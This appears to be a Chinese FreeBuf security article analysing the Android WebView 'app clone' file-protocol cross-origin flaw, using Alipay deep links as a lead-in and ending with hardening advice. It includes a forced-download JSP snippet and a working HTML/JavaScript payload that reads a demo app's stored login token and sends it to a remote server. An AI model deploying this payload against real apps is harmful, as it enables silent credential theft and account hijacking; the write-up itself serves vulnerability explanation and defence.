@@ -1,0 +1,55 @@
+*本文原创作者：rebeyond，本文属FreeBuf原创奖励计划，未经许可禁止转载
+前言
+2018年1月9号，腾讯玄武实验室召开了一个新闻发布会，向公众公布并演示了“应用克隆”漏洞，并称：利用该漏洞，用户只需要点击一个链接，用户的支付宝、携程等APP的登陆状态，就可以被克隆到其他用户的手机上，一时造成用户恐慌。恰好这段时间支付宝的“天天领红包”活动进行的如火如荼，出现了通过点击一个链接就自动抢红包的薅羊毛方式。
+下面结合支付宝的自动领红包链接，对“应用克隆”漏洞从技术原理上作一下分析。
+支付宝自动领红包
+简介
+在去年年底，支付宝推出了一个“天天领红包”活动，用户只需要将自己的红包口令通过短信或者微信的方式发给对方，对方复制该条信息然后打开支付宝APP，便会得到一个支付宝红包，这个红包可以直接用于支付宝消费，消费之后，推荐人会得到一笔赏金，直接到账。当然也可以直接让对方用支付宝扫描自己的推荐二维码，效果一样。这次活动持续时间长、活动力度大，羊毛很厚，因此大量用户为了赚取赏金，开始各显神通，比如下面这两个：
+然后聪明的程序员做了一个链接，对方只要点击一下这个链接就会自动打开支付宝领一个红包，免去了扫描二维码、复制红包口令、手动打开支付宝APP这些繁琐的操作。笔者在元旦假期的时候，也尝试做了这么一个链接，起了一个诱人的标题发布到了微信朋友圈，刚发布一会几十块钱赏金就到账了，确实比发推广信息效率高很多：
+技术原理
+其实通过网页唤起第三方APP不是什么新鲜的技术，做过安卓开发的应该都很熟悉。支付宝、导航系统、各种手机播放器等APP都大量的用到了这种技术，比如通过网页打开一个视频播放界面，这时旁边会有个按钮“在APP中播放”，点击后会直接打开对应的APP继续播放之前的视频。实现这个需求只需要在定义activity的时候，指定一个scheme（协议），并且设置一个name为android.intent.category.BROWSABLE的category即可。这种在浏览器中通过自定义协议打开第三方应用的方法我们可以称之为“伪协议”（正常在浏览器中打开的都是http、https、ftp这种常规协议），下图即为支付宝定义的伪协议：
+接下来分析一下支付宝红包的推荐二维码，解析二维码得到URL:https://qr.alipay.com/c1x05309e4ttz2v7xrwrzcd，访问该URL并抓包分析发现：
+https://qr.alipay.com/c1x05309e4ttz2v7xrwrzcd返回302跳转到了https://mobilecodec.alipay.com/client_download.htm?qrcode=c1x05309e4ttz2v7xrwrzcd，
+https://mobilecodec.alipay.com/client_download.htm?qrcode=c1x05309e4ttz2v7xrwrzcd返回302跳转到了
+https://ds.alipay.com/?from=mobilecodec&scheme=alipays%3A%2F%2Fplatformapi%2Fstartapp%3FsaId%3D10000007%26clientVersion%3D3.7.0.0718%26qrcode%3Dhttps%253A%252F%252Fqr.alipay.com%252Fc1x05309e4ttz2v7xrwrzcd%253F_s%253Dweb-other
+分析最后这个URL发现其scheme参数即为拉起支付宝的关键，URL解码:
+scheme=alipays://platformapi/startapp?saId=10000007&clientVersion=3.7.0.0718&qrcode=https%3A%2F%2Fqr.alipay.com%2Fc1x05309e4ttz2v7xrwrzcd%3F_s%3Dweb-other
+通过上面这个参数我们可以清晰的看到这是一个启动支付宝的伪协议，在启动的时候向支付宝传递了3个参数：saId、clientVersion、qrcode，其中qrcode即为我们的红包推荐二维码链接。所以猜测这个activity的功能就是打开我们通过qrcode指定的URL。接下来写一个简单的alipay.htm页面来测试：
+<html> <script> window.location.href='alipays://platformapi/startapp?saId=10000007&clientVersion=3.7.0.0718&qrcode=https%3A%2F%2Fqr.alipay.com%2Fc1x05309e4ttz2v7xrwrzcd%3F_s%3Dweb-other' </script> </html>
+打开效果如下（大家可以将以下链接复制到手机浏览器测试http://114.115.139.176/alipay.htm）：
+浏览器成功唤起了支付宝APP，并跳到了领红包的界面。到此，支付宝自动抢红包的链接就分析完成了。
+扩展
+在上面支付宝自动抢红包的伪协议中，可以看到我们可以通过控制qrcode参数来控制支付宝打开我们指定的一个链接，这里qrcode是不是只能打开支付宝的页面呢？下面我们用百度测试一下，构造如下URL：
+alipays://platformapi/startapp?saId=10000007&clientVersion=3.7.0.0718&qrcode=https%3A%2F%2Fwww.baidu.com%2F
+发现可以成功打开，效果如下：
+像这种通过接收外部传入的URL参数，然后在APP内进行加载的特性，是导致下面所介绍的“应用克隆”漏洞的元凶。
+应用克隆
+简介
+2017年12月7日，国家信息安全漏洞共享平台（CNVD）接收到腾讯玄武实验室报送的Android WebView存在跨域访问漏洞(CNVD-2017-36682)。攻击者利用该漏洞，可远程获取用户隐私数据（包括手机应用数据、照片、文档等敏感信息），还可窃取用户登录凭证，在受害者毫无察觉的情况下实现对APP用户账户的完全控制。由于该组件广泛应用于Android平台，导致大量APP受影响，构成较为严重的攻击威胁。
+跨域
+CNVD将应用克隆漏洞(CNVD-2017-36682)描述为“AndroidWebView存在跨域访问漏洞”，那么我们就先来看看什么是跨域。讨论跨域，自然要从浏览器的安全机制“同源策略”谈起，同源策略是由Netscape提出的一个著名的安全策略，其限制从一个源加载的文档或脚本与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的关键的安全机制。如果两个URL的协议、端口、域名是相同的，则认为这两个URL是同源的，互相访问资源不受限制，比如 http://a.com/a.html中的脚本可以向http://a.com/b.htm发起ajax请求，并获取响应内容。但是如果http://a.com/a.html中的脚本向http://b.com/b.htm发起请求就会被禁止，因为此时两者属于不同的源，而这个被禁止的请求就叫跨域请求。同源策略为很多正常的web业务场景带来了不便，因此出现了CORS和JSONP等合法的跨域机制。
+File协议
+File协议主要用于访问本地计算机中的文件，就如同在Windows资源治理器中打开文件一样，比如我想查看本地/etc/hosts文件的内容，我就可以直接在浏览器输入file:///etc/hosts来访问。当然我们也可以通过浏览器访问本地的html文件，文件中也可以内嵌JavaScript脚本，脚本里面可以继续访问File协议，这样可以读取webview所在进程具有读取权限的所有本地文件的内容。这样似乎也没什么问题，毕竟所有的数据操作都是发生在本地的。但是Android的webview有个API叫做 setAllowUniversalAccessFromFileURLs，当该API的设置值为True时，其实就是开启了File协议的跨域机制，File协议中的脚本可以跨域访问其他协议，比如http，这样就存在问题了：攻击者通过让webview加载一个本地恶意的htm文件，这个htm文件会读取本地的敏感文件内容，并把内容通过http请求发送至远程服务器。这也便是“应用克隆”漏洞发生的根源。
+通过上面的描述可以总结得知，如果想要成功利用应用克隆漏洞，至少需要满足如下几个要求：
+1. 攻击者可以外部调用被攻击APP，指令其加载一个本地的html文件。从前文得知通过向支付宝传递qrcode参数可以指令其访问指定的URL，不过经过实测，这个URL不能是File协议的，因此不能指定支付宝访问本地的html文件。
+2. 被攻击APP的setAllowUniversalAccessFromFile URLs值为true。这个条件就比较苛刻了，在Android4.1（ 2012年发布）之前的版本，该选项默认为True，之后的版本默认值为False。所以除非 APP是很老的版本，或者是新版本有着很特殊的业务需求，否则的话是不会将setAllowUniversalAccessFrom FileURLs设置为True的。
+3. 攻击者需要在被攻击的手机上下载一个html文件并保存在一个可被File协议访问到的位置。在Android老版本曾经出现过几个漏洞，可以让Android系统自带浏览器静默下载html文件到默认的下载目录下，过程不需要与用户交互。即使现在，chrome的最新版仍然可以通过访问一个链接直接静默下载html文件到默认下载目录下：
+<% response.setHeader("Content-Disposition","attachment;filename=autodown.htm"); out.print("<html><script>alert('just forautodownload test!')</script></html>"); %>
+将上面的代码保存为down.jsp，然后通过chrome for Android访问，可以自动下载autodown.htm文件至/storage/sdcard0/Download目录下。
+同时满足以上三个条件，就可以达到“应用克隆”的效果了。
+实例演示
+由于支付宝最新版不同时满足前面提到的三个条件，甚至支付宝在“应用克隆”漏洞发布会举行前的多个历史版本也不能同时满足“应用克隆”的条件。这里就以我自己编写的一个APP来作为案例演示。
+该APP实现了以下功能：
+1. 跟支付宝类似，该APP可以被浏览器通过伪协议唤起，且可以接受浏览器传递的url参数，并在APP内部调用webview组件加载该URL。 2. 提供本地登录功能，登录成功后，将token持久化在sharedpreferences中，下次打开APP会自动读取sharedpreferences中的token用于身份验证，不需要每次打开APP都要重新登录。
+正常情况下，APP首次打开会要求用户输入用户名密码：
+登陆成功之后，主页面会显示当然登陆的用户名及token信息：
+下面构造一个准备下载到手机上的恶意htm文件，内容如下：
+<html> test by me! <script> var arm ="file:///data/data/com.example.q00412688.myapplication/shared_prefs/config.xml"; var xmlhttp; if (window.XMLHttpRequest) { xmlhttp=new XMLHttpRequest(); } xmlhttp.onreadystatechange=function() { //alert("statusis"+xmlhttp.status); if (xmlhttp.readyState==4) { window.data=xmlhttp.responseText alert(window.data); var url ="http://114.115.139.176/getdata.jsp?data="+window.data; var xmlhttp2; if(window.XMLHttpRequest) { xmlhttp2=newXMLHttpRequest(); } xmlhttp2.onreadystatechange=function() { //alert("statusis"+xmlhttp.status); if(xmlhttp2.readyState==4) { alert(xmlhttp2.responseText); } } xmlhttp2.open("GET",url); xmlhttp2.send(null); } } xmlhttp.open("GET",arm); xmlhttp.send(null); </script> </html>
+然后在服务器测准备一个getdata.jsp文件用来接收被攻击手机发来的数据，接下来我准备了两台手机A和B，在A手机上登陆了a@a.com用户，在B手机上登陆了b@b.com用户，然后在a@a.com用户的手机上打开一个恶意链接，之后B手机上登陆的用户由b@b.com变成a@a.com，通过对方点击一个链接，我们成功获取了对方的token，实现了“克隆”。
+演示视频：
+防御建议
+1. 如果APP支持Android4.1（API level 16）之前的版本，请将setAllowFileAccessFromFileURLs 或setAllowUniversalAccessFromFileURLs显示设置为False。如前文所述，“应用克隆”应用克隆的漏洞本质是file协议中的js读取本地文件内容并跨域通过http、https、ftp等协议发送出去，所以通过setAllowUniversalAccessFromFileURLs为False阻断file协议跨域，通过设置setAllowFileAccessFromFileURLs阻止file协议中的js读取本地文件的内容。
+2. 如果业务需要不能将上述两个选项设置为False，可以对webview加载的URL进行白名单限制。
+总结
+其实这个漏洞并不是什么新漏洞，setAllowFileAccessFromFileURLs、setAllowUniversalAccessFromFileURLs这两个API早就是webview常规安全加固项的排查目标之一了。发布会中提到的“新攻击模型”，也只是file跨域的众多攻击向量中的一个。
+*本文原创作者：rebeyond，本文属FreeBuf原创奖励计划，未经许可禁止转载
